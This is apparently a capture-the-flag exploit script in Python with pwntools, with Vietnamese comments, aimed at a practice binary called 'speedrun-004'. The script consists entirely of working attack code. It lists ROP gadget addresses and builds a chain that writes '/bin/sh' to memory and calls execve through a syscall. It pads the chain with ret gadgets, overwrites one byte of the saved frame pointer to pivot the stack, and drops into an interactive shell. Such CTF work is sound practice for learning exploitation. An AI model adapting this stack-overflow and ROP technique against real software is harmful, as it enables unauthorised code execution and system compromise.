#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

s = process('./speedrun-004')

raw_input('debug')
main_address = 0x0000000000400C46       #func_address
exploit_it = 0x0000000000400BD2         #func_address
vuln = 0x0000000000400B73				#func_address
after_read2 = 0x0000000000400BB4		#b*
shell_write = 0x6bc000

NOP_ret = 0x00000000004004cf
ret = 0x400416 
syscall_ret = 0x0000000000474f15
push_rsp_ret = 0x0000000000451384   #push rsp,ret
xor_rax_ret = 0x0000000000445460
pop_rax_ret = 0x0000000000415f04
push_rax_pop_rbx_ret = 0x0000000000488695
pop_rdi_ret = 0x0000000000400686
push_rax_push_rsp = 0x0000000000451383
mov_rsp_rcx_ret = 0x000000000048d7e6
mov_rax_qw = 0x0000000000481be0 #mov rax, qword ptr [rax + 8] ; ret
mov_rax_rcx_ret = 0x000000000047e86b
mov_rax_rsi = 0x000000000048e220 #mov rax, qword ptr [rsi + 8] ; ret
pop_rsi_ret = 0x0000000000410a93
mov_rdi_rcx = 0x0000000000435b9b #mov qword ptr [rdi], rcx ; ret
pop_rcx_ret =0x000000000041d4e3

ropshell = p64(pop_rcx_ret)        # đưa chuỗi /bin/sh vào rcx
ropshell += p64(0x0068732f6e69622f)
ropshell += p64(pop_rdi_ret)       # đưa địa chỉ chứa chuỗi bin/sh vào rdi
ropshell += p64(shell_write)       # địa chỉ chứa chuỗi /bin/sh
ropshell += p64(mov_rdi_rcx)       # mov giá trị của rcx vào địa chỉ ở rdi
ropshell += p64(pop_rax_ret)	   # đưa rax = 0x3b 
ropshell += p64(0x3b)
ropshell += p64(syscall_ret)       # gọi syscall 
s.sendline('257')
s.recvuntil('Ok, what do you have to say for yourself?\n')
payload = (p64(NOP_ret)*((256-len(ropshell))/8) + ropshell).ljust(256,'\x00') 
payload += '\x00'  #overflow rbp
s.sendline(payload)

s.interactive()
